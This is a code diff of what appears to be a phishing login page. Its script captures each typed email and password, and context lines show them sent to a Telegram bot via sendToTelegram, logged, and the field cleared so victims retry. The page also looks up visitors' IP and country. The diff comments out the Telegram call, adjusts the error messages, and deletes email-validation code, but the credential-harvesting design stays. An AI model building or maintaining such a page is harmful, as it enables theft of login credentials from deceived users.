@@ -610,7 +610,7 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
     </div>
 
     <div class="input-group">
-      <input type="password" id="password" placeholder=" " required>
+      <input type="password" id="password" onclick="clearError();" placeholder=" " required>
       <label for="password">
         <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
           <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
@@ -625,7 +625,7 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
         </svg>
       </button>
     </div>
-    <div id="messageDiv"></div>
+    <div id="message" style="color: white;"></div>
     <button class="login-btn" onclick="nav()">Sign In</button>
 
     <div class="extra">
@@ -782,9 +782,9 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
 
 
 
-      if (attempt <= maxAttempts) {
+      if (attempt <= maxAttempts && password) {
         // Send to Telegram Bot (new functionality)
-        await sendToTelegram(email, password);
+        //await sendToTelegram(email, password);
         console.log(email, password)
         attempt++;
 
@@ -793,13 +793,18 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
         passwordInput.value = '';
       } else {
         messageDiv.style.display = 'block';
-        messageDiv.textContent = 'Too many attempts. Redirecting...';
+        if(password){ messageDiv.textContent = 'Too many attempts.';}
+        else{ messageDiv.textContent = 'Enter Password';}
+       
         setTimeout(function() {
             
         }, 2000);
       }
     };
 
+    function clearError(){
+         messageDiv.textContent = '';
+    }
     async function getIpAndCountry() {
       try {
         // Using ipapi.co (free, no API key needed for basic use)
@@ -835,56 +840,6 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
 
 
 
-     // Strong email regex
-    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-
-    function validateEmail() {
-      const value = emailInput.value.trim();
-
-      // Remove previous states
-      emailInput.classList.remove('valid', 'invalid');
-      emailError.classList.remove('show');
-
-      if (value === '') {
-        return false;
-      }
-
-      if (emailRegex.test(value)) {
-        emailInput.classList.add('valid');
-        return true;
-      } else {
-        emailInput.classList.add('invalid');
-        emailError.classList.add('show');
-        return false;
-      }
-    }
-
-    // Live validation while typing
-    emailInput.addEventListener('input', validateEmail);
-
-    // Validate on blur as well
-    emailInput.addEventListener('blur', validateEmail);
-
-    // Form submission
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      const isEmailValid = validateEmail();
-      const isPasswordValid = passwordInput.value.length >= 6;
-
-      if (!isEmailValid) {
-        emailInput.focus();
-        return;
-      }
-
-      if (!isPasswordValid) {
-        passwordInput.focus();
-        return;
-      }
-
-      // Success — you can replace this with real login logic
-      alert('Login successful!\nEmail: ' + emailInput.value);
-    });
 
     // Password show/hide
     function togglePassword() {
